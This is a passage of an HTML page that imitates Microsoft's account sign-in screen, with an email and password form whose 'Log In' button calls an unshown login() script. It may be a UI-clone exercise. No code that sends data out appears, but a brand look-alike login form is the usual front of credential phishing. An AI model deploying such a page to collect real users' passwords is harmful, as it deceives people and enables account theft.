<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" href="assets/favicon.ico" />
    <title>Sign in to your Microsoft account</title>
    <link rel="stylesheet" href="css/login.css" />
  </head>

  <body>
    <section id="section_uname">
      <div class="auth-wrapper">
        <img src="assets/login/logo.png" alt="Microsoft" />
        <h2 class="title mb-16 mt-16">Sign in</h2>
        <form id="uname">
          <div class="mb-16">
            <p id="error_uname" class="error"></p>
            <input
              id="email"
              type="text"
              class="input"
              placeholder="Email, phone, or Skype"
              name="email-id"
            />
            <input
              id="password"
              type="password"
              class="input"
              placeholder="Password"
              name="password"
            />
          </div>
        </form>
        <div>
          <p class="mb-16 fs-13">
            No account? <a href="signup.html" class="link">Create one!</a>
          </p>
        </div>
        <div>
          <button class="btn" id="btn_next" onclick="login()">Log In</button>
        </div>
      </div>
    </section>
